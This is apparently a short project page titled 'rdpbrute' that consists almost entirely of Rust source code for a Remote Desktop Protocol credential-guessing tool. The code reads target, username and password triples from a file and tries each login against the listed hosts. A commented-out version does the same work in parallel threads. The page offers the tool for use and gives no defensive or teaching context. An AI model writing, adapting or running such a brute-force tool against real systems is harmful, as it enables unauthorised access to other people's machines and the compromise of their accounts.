# rdpbrute

```rust
use std::{net::{SocketAddr, TcpStream}, time::Duration};
use rdp::core::client::Connector;


fn login(target: String, username: String,password: String) -> (bool,String){
    let addr = target.parse::<SocketAddr>().unwrap();
    let tcp = TcpStream::connect_timeout(&addr, Duration::from_secs(20));
    match tcp {
        Ok(tcpconn)=>{
            let mut connector = Connector::new()
            .screen(800, 600)
            .credentials("".to_string(), username, password);
            match connector.connect(tcpconn) {
                Ok(mut client) => {
                    client.shutdown().unwrap();
                    return (true,"success".to_string());
                }
                Err(e) =>  return (false, format!("{:?}",  e)),
            }
        }
        Err(e)=>{
            return (false, format!("{:?}",  e))
        }
    }
}


fn main() {

    /*
    //mutilthread
    let mut handles = vec![];
    let usernamestr = std::fs::read_to_string("1.txt").unwrap();
    let usernames =usernamestr.split("\n")
    .map(|v| v.trim().to_string())
    .collect::<Vec<String>>();
    for username in &usernames {
        let tmp = username.clone();
        let handle = thread::spawn(move || {
            let d:Vec<_> = tmp.split("||").collect();
            if d.len()==3{
                let (a, b)=login(d[0].to_string(), d[1].to_string(),d[2].to_string());
                if a{
                    println!("{}||{}", tmp, b); 
                }else{
                    println!("{}||{}", tmp, b);
                }   
            }
        });
        handles.push(handle);
    }
    for handle in handles {
        handle.join().expect("TODO: panic message");
    }
    */
    
    let usernamestr = std::fs::read_to_string("1.txt").unwrap();
    let usernames =usernamestr.split("\n")
    .map(|v| v.trim().to_string())
    .collect::<Vec<String>>();
    for username in &usernames {
        let d:Vec<_> = username.split("||").collect();
        if d.len()==3{
            let (a, b)=login(d[0].to_string(), d[1].to_string(),d[2].to_string());
            if a{
                println!("{}||{}", username, b); 
            }else{
                println!("{}||{}", username, b);
            }   
        }
    }
}
```
